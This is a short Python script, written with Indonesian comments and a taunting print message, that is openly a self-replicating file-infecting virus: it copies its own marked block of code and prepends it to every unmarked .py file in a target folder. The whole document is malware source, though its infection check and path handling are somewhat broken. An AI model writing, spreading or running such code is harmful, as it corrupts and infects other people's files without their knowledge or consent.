## Dead ##
import sys
import glob
import os

ActualScript = []
## ( Take all the lines of code Gila ga tuhh)
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

inside_virus = False
for line in lines:
    if (line == "## Dead ##\n"):
        inside_virus=True
    if inside_virus:
        ActualScript.append(line)
    if (line == "## Udahan ##\n"):
        break

python_scripts = glob.glob("./SelfReplicatingVirus/*.py") 
path = os.getcwd() 

for script in python_scripts:
    with open(path + script ,"r") as fuf:
        script_code = fuf.readlines()

    is_infected = False
    for line in script_code:
        if line == "## Dead ##\n":
            is_infected = True
            break
        
        if not is_infected:
            replicate_code = []
            replicate_code.extend(ActualScript)
            replicate_code.extend("\n")
            replicate_code.extend(script_code)
            
            with open(path + script,"w") as fuf:
                fuf.writelines(replicate_code)
print("LU UDAH KE HACK TAI !!!")
## Udahan ##